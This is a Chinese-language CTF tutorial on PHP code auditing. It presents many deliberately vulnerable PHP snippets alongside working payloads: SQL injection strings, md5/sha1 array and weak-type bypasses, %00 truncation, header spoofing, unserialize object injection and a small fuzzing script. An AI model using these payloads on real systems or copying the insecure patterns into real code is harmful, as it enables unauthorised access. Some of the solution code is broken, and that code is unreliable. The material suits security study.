# PHP代码审计分段详解

**文章**
php项目地址：https://github.com/bowu678/php_bugs
玩家详解好文:https://www.cnblogs.com/Cl0ud/p/13228066.html

**环境**

phpstudy-php7.0.9

**目录索引**

- [extract变量覆盖漏洞](#extract变量覆盖漏洞)
- [绕过过滤的空白字符](#绕过过滤的空白字符)
- [多重加密](#多重加密)
- [SQL注入_WITH_ROLLUP绕过](#SQL注入_WITH_ROLLUP绕过)
- [ereg正则%00截断](#ereg正则%00截断)
- [strcmp比较字符串](#strcmp比较字符串)
- [sha()函数比较绕过](#sha()函数比较绕过)
- [SESSION验证绕过](#SESSION验证绕过)
- [密码md5比较绕过](#密码md5比较绕过)
- [urldecode二次编码绕过](#urldecode二次编码绕过)
- [sql闭合绕过](#sql闭合绕过)
- [X-Forwarded-For绕过指定IP地址](#X-Forwarded-For绕过指定IP地址)
- [md5加密相等绕过](#md5加密相等绕过)
- [intval函数四舍五入](#intval函数四舍五入)
- [strpos数组绕过NULL与ereg正则%00截断](#strpos数组绕过NULL与ereg正则%00截断)
- [SQL注入or绕过](#SQL注入or绕过)
- [密码md5比较绕过](#密码md5比较绕过)
- [md5()函数===使用数组绕过](#md5()函数===使用数组绕过)
- [ereg()函数strpos()函数用数组返回NULL绕过](#ereg()函数strpos()函数用数组返回NULL绕过)
- [十六进制与数字比较](#十六进制与数字比较)
- [数字验证正则绕过](#数字验证正则绕过)
- [弱类型整数大小比较绕过](#弱类型整数大小比较绕过)
- [md5函数验证绕过](#md5函数验证绕过)
- [md5函数true绕过注入](#md5函数true绕过注入)
- [switch没有break字符与0比较绕过](#switch没有break字符与0比较绕过)
- [unserialize()序列化](#unserialize()序列化)
- [利用提交数组绕过逻辑](#利用提交数组绕过逻辑)
## extract变量覆盖漏洞

**部分源码**
```php
<?php
$flag='xxx'; 
extract($_GET);
 if(isset($shiyan))
 { 
    $content=trim(file_get_contents($flag));
    if($shiyan==$content)
    { 
        echo'ctf{xxx}'; 
    }
   else
   { 
    echo'Oh.no';
   } 
   }
?>
```

**漏洞原理**
- 变量覆盖漏洞：自定义的参数值替换原有变量值的情况

**漏洞利用**
file_get_contents函数读取一个文件，当读取一个不存着的文件会为空，则使$flag=x从而$content为空，extract函数在$flag=xxx后面，可以重新赋值flag来覆盖前面的变量，最终的payload如下：

``http://127.0.0.1/index.php?shiyan=&flag=1``

## 绕过过滤的空白字符

**部分源码**

```php
<?php
$info = ""; 
$req = [];
$flag="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
 
ini_set("display_error", false); //为一个配置选项设置值
error_reporting(0); //关闭所有PHP错误报告
 
if(!isset($_GET['number'])){
   header("hint:26966dc52e85af40f59b4fe73d8c323a.txt"); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt
 
   die("have a fun!!"); //die — 等同于 exit()
 
}
 
foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式 
    foreach($global_var as $key => $value) { 
        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
        is_string($value) && $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
    } 
} 

function is_palindrome_number($number) { 
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0; 
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
} 
 
 
if(is_numeric($_REQUEST['number'])) //is_numeric — 检测变量是否为数字或数字字符串 
{
 
   $info="sorry, you cann't input a number!";
 
}
elseif($req['number']!=strval(intval($req['number']))) //intval — 获取变量的整数值
{
 
     $info = "number must be equal to it's integer!! ";  
 
}
else
{
 
     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));  
 
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }
     else
     {
 
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!"; 
          }
          else
          {
             $info=$flag;
          }
     }

}
echo $info;
```

**思路分析**

```
1. 要求 is_numeric($_REQUEST['number'])  %00开头绕过
2. 要求 $req['number']==strval(intval($req['number']))
3. 要求 intval($req["number"]) == intval(strrev($req["number"]))
4. is_palindrome_number()返回False


总体来说 要令$number是回文，又要令$number不是回文，需要一个字符能勾逃逸出intval和is_numberic函数但逃逸不出is_palingdrome_number函数的字符。

可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响

fuzzing思路：http://127.0.0.1/index.php?number%00%2B181,%2B解析后为+,也就是'+191'=='191'且intval('191+')==191
```

fuzzing脚本
```py
import requests
for i in range(256):
    url = "http://127.0.0.1/index.php?number=%00%{:02X}12321".format(i) #{:02x}十六进制输出，2位对齐左补0
    rep = requests.get(url=url)
    if 'x' in rep.text:
        print(url)
```

输出结果为
```
http://127.0.0.1/index.php?number=%00%0C12321
http://127.0.0.1/index.php?number=%00%2B12321
```

## 多重加密

**部分源码**
```php
<?php
    include 'common.php';
    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
    //把一个或多个数组合并为一个数组
    class db
    {
        public $where;
        function __wakeup()
        {
            if(!empty($this->where))
            {
                $this->select($this->where);
            }
        }
        function select($where)
        {
            $sql = mysql_query('select * from user where '.$where);
            //函数执行一条 MySQL 查询。
            return @mysql_fetch_array($sql);
            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
        }
    }
    if(isset($requset['token']))
    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
    {
        $login = unserialize(gzuncompress(base64_decode($requset['token'])));
        //gzuncompress:进行字符串压缩
        //unserialize: 将已序列化的字符串还原回 PHP 的值

        $db = new db();
        $row = $db->select('user=\''.mysql_real_escape_string($login['user']).'\'');
        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。

        if($login['user'] === 'ichunqiu')
        {
            echo $flag;
        }else if($row['pass'] !== $login['pass']){
            echo 'unserialize injection!!';
        }else{
            echo "(╯‵□′)╯︵┴─┴ ";
        }
    }else{
        header('Location: index.php?error=1');
    }
?>
```

**关键代码**

```php
if($login['user'] === 'ichunqiu')
        {
            echo $flag;

# 跟踪$login
$login = unserialize(gzuncompress(base64_decode($requset['token'])));

# 跟踪$requset['token']
$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
```

```php
$token= array(['user'] === 'ichunqiu');
$token= base64_encode(gzcompress(serialize($token)));
echo $token;
// 输出为eJxLtDK0qs60MrBOAuJaAB5uBBQ=
```

## SQL注入_WITH_ROLLUP绕过

**部分源码**
```php
<?php
error_reporting(0);

if (!isset($_POST['uname']) || !isset($_POST['pwd'])) {
    echo '<form action="" method="post">'."<br/>";
    echo '<input name="uname" type="text"/>'."<br/>";
    echo '<input name="pwd" type="text"/>'."<br/>";
    echo '<input type="submit" />'."<br/>";
    echo '</form>'."<br/>";
    echo '<!--source: source.txt-->'."<br/>";
    die;
}

function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){

//检测变量是否是数组

        $StrValue=implode($StrValue);

//返回由数组元素组合成的字符串

    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   

//匹配成功一次后就会停止匹配

        print "水可载舟，亦可赛艇！";
        exit();
    }
}

$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){ 

//遍历数组

    AttackFilter($key,$value,$filter);
}

$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");
if (!$con){
    die('Could not connect: ' . mysql_error());
}
$db="XXXXXX";
mysql_select_db($db, $con);

//设置活动的 MySQL 数据库

$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 

//执行一条 MySQL 查询

if (mysql_num_rows($query) == 1) { 

//返回结果集中行的数目

    $key = mysql_fetch_array($query);

//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false

    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
    print "一颗赛艇！";
}
mysql_close($con);
?>
```

**思路分析**

函数介绍：https://blog.csdn.net/id19870510/article/details/6254358
分组后会多一行进行统计，而多出的一行的pwd会是NULL！而user会是数据库表中已存在的字段。

``mysql_num_rows($query) == 1``限制只能返回结果集中行的数目为1
所以使用
```
limit m offset n
m: 展示m条
n: 跳过n条
```

payload:
``1' or 1 group by pwd with rollup limit 1 offset 2#``

密码栏不输入则为null，成功满足条件输出flag


## ereg正则%00截断

**部分源码**

```php
<?php 
$flag = "flag";
if (isset ($_GET['password'])) 
{
  if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
  {
    echo '<p>You password must be alphanumeric</p>';
  }
  else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
   {
     if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置
      {
      die('Flag: ' . $flag);
      }
      else
      {
        echo('<p>*-* have not been found</p>'); 
       }
      }
     else 
     {
        echo '<p>Invalid password</p>'; 
      }
   } 
?>
```
**漏洞原理**
- ereg函数是一个存在缺陷的函数，现在大都使用preg_match函数对其替换，其缺陷在于：当ereg()函数碰到%00的时候，就会认为字符串结束了，并不会继续向下检测，另外当其碰到数组的时候返回为NULL

**思路分析**

需要password长度小于8并且大于9999999，这个可以直接使用科学计数法绕过，即1e9这种

想要找到该字符串`-*-`，就需要突破第一个if的限制，这里我们使用到的就是%00截断
```
?password=1e8%00*-*
```

## strcmp比较字符串

**部分源码**
```php
<?php
$flag = "flag";
if (isset($_GET['a'])) {  
    if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。 

    //比较两个字符串（区分大小写） 
        die('Flag: '.$flag);  
    else  
        print 'No';  
}
?>
```

**思路分析**

假设传入的是非字符串，函数会出现报错，但是函数返回0，从而符合判断结果，最终的payload如下：
```
?a[]=1
```

## sha()函数比较绕过

**部分源码**
```php
<?php
$flag = "flag";

if (isset($_GET['name']) and isset($_GET['password'])) 
{
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else
    echo '<p>Login first!</p>';
?>
```

**思路分析**

- 关键代码：
```
$_GET['name'] != $_GET['password']
sha1($_GET['name']) === sha1($_GET['password'])
```

- 这里可用数组来进行绕过，因为sha1()函数不能处理数组类型，将报错并返回NULL，条件成立输出flag，payload如下：
``?name[]=1&password[]=2``


## SESSION验证绕过
**部分源码**
```php
<?php

$flag = "flag";

session_start(); 
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print '<p>Wrong guess.</p>';
}
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?>
```

**思路分析**

关键代码:
```
if ($_GET['password'] == $_SESSION['password'])
```

将传入的password为空，删除cookies即可


## 密码md5比较绕过

**部分源码**

```php
<?php
if($_POST[user] && $_POST[pass]) {
    $conn = mysql_connect("********, "*****", "********");
    mysql_select_db("phpformysql") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);
$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
    echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```

**思路分析**

关键代码如下:
```php
$user = $_POST[user];
$pass = md5($_POST[pass]);
...
$sql = "select pw from php where user='$user'";
...
 if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
    echo "<p>Logged in! Key:************** </p>";
```

也就是说让数据库取出来的$row[pw]和md5($_POST[pass])相等。我们可以发现这里sql未做任何的限制或者过滤，因此可以使用union select 组合结果到$query里面去。payload如下:

?user=' union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
```
前一个查询为空，后一个查询为已知的123456的md5值，与传入的pass相等，获得flag
```

## urldecode二次编码绕过

**部分源码**
```php
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```

**思路分析**

浏览器会urldecode解码一次，PHP代码会urldecode解码一次，总共是两次解码，若只编码一次，会被eregi匹配拦截，故编码两次。payload如下:

```
?id = %2568ackerDJ
```

## sql闭合绕过

**部分源码**

```php
<?php
if($_POST[user] && $_POST[pass]) {
    $conn = mysql_connect("*******", "****", "****");
    mysql_select_db("****") or die("Could not select database");
    if ($conn->connect_error) {
        die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);

//select user from php where (user='admin')#
//exp:admin')#

$sql = "select user from php where (user='$user') and (pw='$pass')";
$query = mysql_query($sql);
if (!$query) {
    printf("Error: %s\n", mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  if($row['user']=="admin") {
    echo "<p>Logged in! Key: *********** </p>";
  }

  if($row['user'] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
?>
```

**思路分析**

关键代码：
```
$sql = "select user from php where (user='$user') and (pw='$pass')";
```
payload如下:
```
admin')#
```

## X-Forwarded-For绕过指定IP地址

**部分源码**

```php
<?php
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
    $cip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
    $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
    $cip = $_SERVER["REMOTE_ADDR"];
else
    $cip = "0.0.0.0";
return $cip;
}

$GetIPs = GetIP();
if ($GetIPs=="1.1.1.1"){
echo "Great! Key is *********";
}
else{
echo "错误！你的IP不在访问列表之内！";
}
?>
```

**思路分析**
- 伪造IP
- X-Forwarded-For: 1.1.1.1

## md5加密相等绕过

**部分源码**
```php
<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
?>
```

**思路分析**
- 考点:md5碰撞

https://blog.csdn.net/qq_38603541/article/details/97108663

## intval函数四舍五入

**部分源码**

```php
<?php

if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}

?>
```

**思路分析**
- 小数点绕过
- id=1024.1212

## strpos数组绕过NULL与ereg正则%00截断

**部分源码**

```php
<?php

$flag = "flag";

    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }

 ?>
```

**思路分析**

- ?nctf=123%00%23biubiubiu

## SQL注入or绕过

**部分源码**
```php
<?php
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';
 
function clean($str){
    if(get_magic_quotes_gpc()){ //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置
        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\' 转换为 ' 等等）。双反斜线（\\）被转换为单个反斜线（\）。
    }
    return htmlentities($str, ENT_QUOTES);
}
 
$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);
 
//$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';
 
$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
    die('Invalid password!');
}
echo $flag;
?>
```

**思路分析**

关键代码:
```
$query='SELECT * FROM users WHERE name=\''admin\'\' AND pass=\''or 1 #'\';';
```

典型的万能密码?username=admin\'\' AND pass=\''or 1 #&password=

## 密码md5比较绕过

**部分源码**
```php
<?php

if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user=' $user '"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {

    //strcasecmp:0 - 如果两个字符串相等

      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```

**思路分析**

- 跟第九题类似
- payload如下:
```
?user='and 0=1 union select 'e10adc3949ba59abbe56e057f20f883e' #&pass=123456
```

## md5()函数===使用数组绕过

**部分源码**
```php
<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
    if ($_GET['username'] == $_GET['password'])
        print 'Your password can not be your username.';
    else if (md5($_GET['username']) === md5($_GET['password']))
        die('Flag: '.$flag);
    else
        print 'Invalid password';
}
?>
```

**思路分析**

- GET传入的username与password不同但md5相同才能输出flag，由于是三个等号，不能用md5碰撞，可用数组绕过，payload如下:(PHP对数组进行hash计算都会得到NULL的空值)
```
?username[]=1&password[]=2
```

## ereg()函数strpos()函数用数组返回NULL绕过

**部分源码**

```php
<?php  

$flag = "flag";  
   
if (isset ($_GET['password'])) {  
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)  
        echo 'You password must be alphanumeric';  
    else if (strpos ($_GET['password'], '--') !== FALSE)  
        die('Flag: ' . $flag);  
    else  
        echo 'Invalid password';  
}  
?>
```

**思路分析**

- 典型的ereg截断绕过，上面题目讲过了, payload如下:

```
?password=abc123%00--
```

- 另外还有一种方法：数组绕过:ereg和strpos两个函数处理数组都会返回NULL，NULL!==FALSE
```
?password[]=
```

## 十六进制与数字比较

**部分源码**
```php
<?php
error_reporting(0);
function noother_says_correct($temp)
{
    $flag = 'flag{test}';
    $one = ord('1');  //ord — 返回字符的 ASCII 码值
    $nine = ord('9'); //ord — 返回字符的 ASCII 码值
    $number = '3735929054';
    // Check all the input characters!
    for ($i = 0; $i < strlen($number); $i++)
    { 
        // Disallow all the digits!
        $digit = ord($temp{$i});
        if ( ($digit >= $one) && ($digit <= $nine) )
        {
            // Aha, digit not allowed!
            return "flase";
        }
    }
    if($number == $temp)
        return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);
?>
```

**思路分析**

- noother_says_correct函数处理的逻辑为：先对password中的每一位进行判断，若在1--9之间，则直接返回false，若都满足，并且$number = '3735929054',$number==$password，则返回flag。

关键代码:
```
$number == $temp
```

- 两个等号弱类型比较，会先将比较的两者类型转化后再比较，可用十六进制绕过for循环同时满足temp

- 3735929054转换成十六进制后为：deadc0de

- 加上0x后为0xdeadc0de，可以看出可以逃逸出for循环中的限制，所以最后的payload为：

```
?password=0xdeadc0de
```

## 数字验证正则绕过
**部分源码**
```php
<?php
error_reporting(0);
$flag = 'flag{test}';
if  ("POST" == $_SERVER['REQUEST_METHOD'])
{
    $password = $_POST['password'];
    if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配
    {
        echo 'Wrong Format';
        exit;
    }
    while (TRUE)
    {
        $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
        if (6 > preg_match_all($reg, $password, $arr))
            break;
        $c = 0;
        $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母
        foreach ($ps as $pt)
        {
            if (preg_match("/[[:$pt:]]+/", $password))
                $c += 1;
        }
        if ($c < 3) break;
        //>=3，必须包含四种类型三种与三种以上
        if ("42" == $password) echo $flag;
        else echo 'Wrong password';
        exit;
    }
}
?>
```

**思路分析**

- PHP常见正则表达式
```
[[:alpha:]] ：匹配任何字母
[[:digit:]] ：匹配任何数字
[[:alnum:]] ：匹配任何字母和数字
[[:space:]] ：匹配任何空白字符
[[:upper:]] ：匹配任何大写字母
[[:lower:]] ：匹配任何小写字母
[[:punct:]] ：匹配任何标点符号
[[:xdigit:]] ：匹配任何16进制数字，相当于[0-9a-fA-F]
[[:blank:]] ：匹配空格和Tab，等价于[\t]
[[:cntrl:]] ：匹配所有ASCII 0到31之间的控制符
[[:graph:]] ：匹配所有的可打印字符，等价于[^ \t\n\r\f\v]
[[:print:]] ：匹配所有的可打印字符和空格，等价于[^\t\n\r\f\v]
```

- 关键代码分析:
```php
if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password))
// 第一个if匹配所有的可打印字符并且大于12等于个
...
$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
// 标点符号;数字;大写字母;小写字母 需要将password至少分为6段 
// 例如：abc123+a1? 就可以分为：abc 123 + a 1 ? 这6段
...
$c = 0;
$ps = array('punct', 'digit', 'upper', 'lower'); 
foreach ($ps as $pt)
{
    if (preg_match("/[[:$pt:]]+/", $password))
        $c += 1;
}
if ($c < 3) break;
// 匹配 标点符号，数字，大写字母，小写字母中的至少三种
...
if ("42" == $password) echo $flag;
// 要求password的值为43，这里弱类型可以联想到十六进制或科学计数法
```

```php
var_dump(0 == "a"); // 0 == 0 -> true
var_dump("1" == "01"); // 1 == 1 -> true
var_dump("10" == "1e1"); // 10 == 10 -> true
var_dump(100 == "1e2"); // 100 == 100 -> true
```

```
password=420.00000e-1
```

## 弱类型整数大小比较绕过

**部分源码**
```php
<?php
error_reporting(0);
$flag = "flag{test}";

$temp = $_GET['password'];
is_numeric($temp)?die("no numeric"):NULL;    
if($temp>1336){
    echo $flag;
}
?>
```

**思路分析**

- 考点:is_numeric()弱类型比较,会将1888a转化为1888再比较
```
?password=1888a
```

## md5函数验证绕过

**部分源码**
```php
<?php
error_reporting(0);
$flag = 'flag{test}';
$temp = $_GET['password'];
if(md5($temp)==0){
    echo $flag;
}
?>
```

**思路分析**
- 这里选个加密后为0e开头的字符串，再经过弱类型比较后转为0

- 方法一:不赋值
```
http://xxxxxxx/xxx.php
```
- 方法二:
```
http://xxxxxxx/xxx.php?password=s878926199a
```

## md5函数true绕过注入

**部分源码**
```php
<?php
error_reporting(0);
$link = mysql_connect('localhost', 'root', 'root');
if (!$link) {
  die('Could not connect to MySQL: ' . mysql_error());
}
// 选择数据库
$db = mysql_select_db("security", $link);
if(!$db)
{
  echo 'select db error';
  exit();
}
// 执行sql
$password = $_GET['password'];
$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";
var_dump($sql);
$result=mysql_query($sql) or die('<pre>' . mysql_error() . '</pre>' );
$row1 = mysql_fetch_row($result);
var_dump($row1);
mysql_close($link);
?>
```

**思路分析**

- 关键代码:
```php
$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";
```
- md5($password,true)会将md5后的hex转换为字符串 
- 有如下一个字符串`ffifdyop`,md5后为276f722736c95d99e921722cf9ed621c，hex转换为字符串为:`'or'6<trash>`,从而达到万能密码的效果。

- payload:`?password=ffifdyop`

## switch没有break字符与0比较绕过

**部分源码**

```php
<?php
error_reporting(0);
if (isset($_GET['which']))
{
    $which = $_GET['which'];
    switch ($which)
    {
    case 0:
    case 1:
    case 2:
        require_once $which.'.php';
         echo $flag;
        break;
    default:
        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
        break;
    }
}
?>
```

**思路分析**

- 考点:switch特性与弱类型比较
- switch比较，case 0与case 1都没有break，因此匹配到0与1时，匹配成功并不会退出switch，会继续向下执行，直至遇到break为止。
- PHP中非数字开头字符串和数字 0比较==都返回True，传入flag可令其在switch中匹配到case 0

payload如下:
```
?which=flag
```

## unserialize()序列化

**部分源码**

```php
<!-- index.php -->
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>

<!-- shield.php -->

<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>

<!-- showimg.php -->
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		//stripos — 查找字符串首次出现的位置（不区分大小写）
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	} //showimg这一段禁止了目录穿越以及禁止直接包含pctf文件
```

**思路分析**

```php
<?php

require_once('shield.php');
$x = class Shield();
$g = serialize($x);
echo $g;

?>

<!-- shield.php -->
<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = 'pctf.php') {
            $this -> file = $filename;
        }
        
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
?>
```

payload:
```
http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}
```


## 利用提交数组绕过逻辑

**题目源码**
```php
<?php 
$role = "guest";
$flag = "flag{test_flag}";
$auth = false;
if(isset($_COOKIE["role"])){
    $role = unserialize(base64_decode($_COOKIE["role"]));
    if($role === "admin"){
        $auth = true;
    }
    else{
        $auth = false;
    }
}
else{
    $role = base64_encode(serialize($role));
    setcookie('role',$role);
}
if($auth){
    if(isset($_POST['filename'])){
        $filename = $_POST['filename'];
        $data = $_POST['data'];
        if(preg_match('[<>?]', $data)) {
            die('No No No!'.$data);
        }
        else {
            $s = implode($data);
            if(!preg_match('[<>?]', $s)){
                $flag='None.';
            }
            $rand = rand(1,10000000);
            $tmp="./uploads/".md5(time() + $rand).$filename;
            file_put_contents($tmp, $flag);
            echo "your file is in " . $tmp;
        }
    }
    else{
        echo "Hello admin, now you can upload something you are easy to forget.";
        echo "<br />there are the source.<br />";
        echo '<textarea rows="10" cols="100">';
        echo htmlspecialchars(str_replace($flag,'flag{???}',file_get_contents(__FILE__)));
        echo '</textarea>';
    }
}
else{
    echo "Sorry. You have no permissions.";
}
?>
```

**思路分析**